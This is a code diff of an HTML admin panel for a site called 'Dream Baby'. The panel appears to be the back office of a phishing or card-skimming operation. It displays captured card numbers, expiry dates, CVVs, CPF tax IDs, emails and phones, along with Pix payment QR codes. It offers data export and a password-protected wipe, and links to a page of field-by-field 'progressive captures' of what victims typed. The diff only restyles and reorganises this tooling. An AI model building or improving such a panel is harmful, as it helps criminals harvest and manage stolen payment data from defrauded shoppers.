@@ -1,94 +1,75 @@
-
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
-  <meta charset="UTF-8">
-  <title>Painel Administrativo - Dream Baby</title>
+  <meta charset="UTF-8" />
+  <title>Painel Admin - Dream Baby</title>
   <style>
-    body { font-family: Arial, sans-serif; background: #f9f9f9; margin: 0; padding: 20px; }
+    body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px; }
     h1, h2 { color: #333; }
-    .container { max-width: 900px; margin: auto; }
-    .header, .acoes { margin-bottom: 20px; display: flex; justify-content: space-between; flex-wrap: wrap; gap: 10px; }
-    .bloco { background: #fff; border-radius: 8px; padding: 10px 15px; margin-bottom: 10px; border: 1px solid #ccc; cursor: pointer; }
-    .detalhes, .grupo-capturas, .grupo-pix { display: none; margin-top: 10px; }
-    button, input[type="submit"] { background: #4CAF50; color: white; border: none; padding: 8px 12px; border-radius: 5px; cursor: pointer; }
-    input[type="password"] { padding: 8px; border: 1px solid #ccc; border-radius: 4px; }
-    .pix-bloco { background: #fff; padding: 10px; margin-bottom: 10px; border-radius: 8px; border: 1px solid #ccc; }
-    .pix-bloco img { max-width: 160px; display: block; margin: 10px 0; }
-    .separador { border-top: 2px solid #ddd; margin: 30px 0 20px; }
+    .bloco, .pix-bloco {
+      background: #fff; padding: 12px 15px; margin-bottom: 10px;
+      border: 1px solid #ccc; border-radius: 6px;
+      cursor: pointer;
+    }
+    .detalhes, .lista-capturas, .grupo-pix { display: none; margin-top: 10px; }
+    button, input[type="submit"] {
+      background-color: #4CAF50; color: white;
+      border: none; padding: 10px 15px; margin: 5px;
+      border-radius: 4px; cursor: pointer;
+    }
+    input[type="password"] { padding: 6px; margin-left: 5px; }
+    .acoes { margin-bottom: 20px; }
+    .toggle-titulo { font-weight: bold; color: #333; }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Painel Administrativo - Dream Baby</h1>
-    <div class="acoes">
-      <button onclick="carregarAdmin()">🔄 Recarregar</button>
-      <a href="/exportar-txt"><button>📤 Exportar Dados</button></a>
-      <form onsubmit="return limparDados(this)" style="display:inline;">
-        <label>Senha limpeza:</label>
-        <input type="password" name="senha" required />
-        <input type="submit" value="🧹 Limpar Dados" />
-      </form>
-      <a href="/logout"><button>🚪 Logout</button></a>
-    </div>
+  <h1>Painel Administrativo - Dream Baby</h1>
 
-    <div id="painel">Carregando dados...</div>
+  <div class="acoes">
+    <a href="/exportar-txt"><button>📁 Exportar Dados Finais</button></a>
+    <form onsubmit="return limparDados(this)" style="display:inline;">
+      <label>Senha limpeza:</label>
+      <input type="password" name="senha" required />
+      <input type="submit" value="🧹 Limpar Dados" />
+    </form>
+    <a href="/admin-progressivo"><button>🧮 Ver Capturas Progressivas</button></a>
+    <a href="/logout"><button>🚪 Logout</button></a>
+    <button onclick="carregarAdmin()">🔄 Recarregar</button>
   </div>
+
+  <div id="painel">Carregando dados...</div>
 
   <script>
     async function carregarAdmin() {
       try {
-        const resposta = await fetch("/dados-admin");
-        const dados = await resposta.json();
-        const painel = document.getElementById("painel");
-        painel.innerHTML = "";
+        const res = await fetch('/dados-admin');
+        const dados = await res.json();
+        const painel = document.getElementById('painel');
+        painel.innerHTML = '';
 
         // DADOS FINAIS
         if (dados.finais?.length) {
-          painel.innerHTML += "<h2>Dados Finais</h2>";
+          painel.innerHTML += '<h2>Dados Finais</h2>';
           dados.finais.forEach((dado, i) => {
             painel.innerHTML += `
               <div class="bloco" onclick="alternar('final-${i}')">
                 <strong>${dado.nome}</strong>
                 <div class="detalhes" id="final-${i}">
-                  <div>Número do Cartão: ${dado.numeroCartao}</div>
+                  <div>Número: ${dado.numeroCartao}</div>
                   <div>Validade: ${dado.validade}</div>
                   <div>CVV: ${dado.cvv}</div>
                   <div>CPF: ${dado.cpf}</div>
                   <div>Email: ${dado.email}</div>
                   <div>Telefone: ${dado.telefone}</div>
                 </div>
-              </div>
-            `;
+              </div>`;
           });
-        }
-
-        // CAPTURA PROGRESSIVA
-        if (dados.progressivos?.length) {
-          painel.innerHTML += `
-            <div class="separador"></div>
-            <h2 onclick="alternar('grupo-capturas')" style="cursor:pointer;">📌 Capturas Progressivas</h2>
-            <div id="grupo-capturas" class="grupo-capturas">
-          `;
-          dados.progressivos.forEach((dado) => {
-            painel.innerHTML += `
-              <div class="bloco">
-                <div>Data: ${new Date(dado.data).toLocaleString()}</div>
-                <div>Campo: ${dado.campo}</div>
-                <div>Valor: ${dado.valor}</div>
-              </div>
-            `;
-          });
-          painel.innerHTML += "</div>";
         }
 
         // DADOS PIX
         if (dados.pix?.length) {
-          painel.innerHTML += `
-            <div class="separador"></div>
-            <h2 onclick="alternar('grupo-pix')" style="cursor:pointer;">💳 Pagamentos Pix</h2>
-            <div id="grupo-pix" class="grupo-pix">
-          `;
+          painel.innerHTML += '<h2 onclick="alternar(\'grupo-pix\')" style="cursor:pointer;">💳 Pagamentos Pix</h2>';
+          painel.innerHTML += '<div id="grupo-pix" class="grupo-pix">';
           dados.pix.forEach((pix) => {
             painel.innerHTML += `
               <div class="pix-bloco">
@@ -96,12 +77,12 @@
                 <div><strong>Telefone:</strong> ${pix.telefone}</div>
                 <div><strong>Descrição:</strong> ${pix.descricao}</div>
                 <div><strong>Valor:</strong> R$ ${pix.valor}</div>
-                <div><strong>Código Pix:</strong> ${pix.codigo}</div>
-                <div><img src="${pix.qrcode}" alt="QR Code Pix"></div>
+                <div><strong>Código Pix:</strong> ${pix.qrCodeString}</div>
+                <div><img src="${pix.qrCodeImage}" alt="QR Code Pix" style="max-width: 160px;" /></div>
               </div>
             `;
           });
-          painel.innerHTML += "</div>";
+          painel.innerHTML += '</div>';
         }
 
       } catch (error) {
@@ -110,8 +91,8 @@
     }
 
     function alternar(id) {
-      const alvo = document.getElementById(id);
-      if (alvo) alvo.style.display = (alvo.style.display === "none" || alvo.style.display === "") ? "block" : "none";
+      const el = document.getElementById(id);
+      if (el) el.style.display = (el.style.display === "none" || el.style.display === "") ? "block" : "none";
     }
 
     async function limparDados(form) {
